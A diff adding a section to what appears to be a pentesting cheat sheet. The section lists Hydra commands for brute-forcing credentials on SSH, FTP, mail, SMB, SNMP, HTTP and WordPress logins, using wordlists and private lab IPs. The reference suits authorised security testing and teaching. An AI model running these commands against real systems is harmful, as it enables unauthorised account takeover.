@@ -116,6 +116,61 @@ hydra -l root -P pass.txt ssh://192.168.1.4
 hydra -L users.txt -P pass.txt 192.168.1.4 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Login Failed"
 ```
 
+## SSH
+```bash
+hydra -l root -P passwords.txt ssh://192.168.1.5
+```
+Brute-force SSH using root username and a list of passwords.
+```bash
+hydra -L users.txt -P passwords.txt ssh://192.168.1.4 -t 4 -V
+```
+Brute-force SSH using a list of users and passwords.
+```bash
+hydra -v -V -u -L users.txt -p "" -t 1 -u 192.168.1.4 ssh
+```
+SSH brute-force using empty password and user list (test for blank passwords).
+## FTP
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -vV 192.168.1.4 ftp
+```
+FTP brute-force attack using a known username and wordlist.
+## POP3 / SMTP
+```bash
+hydra -l USERNAME -P /usr/share/wordlists/nmap.lst -f -V 192.168.1.5 pop3
+```
+POP3 brute-force attack using username and password list.
+```bash
+hydra -P /usr/share/wordlists/nmap.lst 192.168.1.5 smtp -V
+```
+SMTP brute-force attack using password list.
+## SMB
+```bash
+hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt 192.168.1.5 smb
+```
+SMB brute-force attack with rockyou wordlist.
+## HTTP-GET (Web Login)
+```bash
+hydra -L webapp.txt -P webapp.txt 192.168.1.5 http-get /admin
+```
+HTTP GET login brute-force (basic directory).
+## Wordpress Login
+```bash
+hydra -l admin -P ./passwordlist.txt 192.168.1.5 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+```
+Wordpress admin login brute-force.
+##  HTTP Basic Auth
+```bash
+hydra -L users.txt -P passwords.txt 192.168.1.5 http-get /
+```
+Basic authentication brute-force.
+## SNMP
+```bash
+hydra -P password-file.txt -v 192.168.1.5 snmp
+```
+SNMP brute-force using password list.
+
+
+
 ### Hydra Module Help
 ```bash
 hydra -U
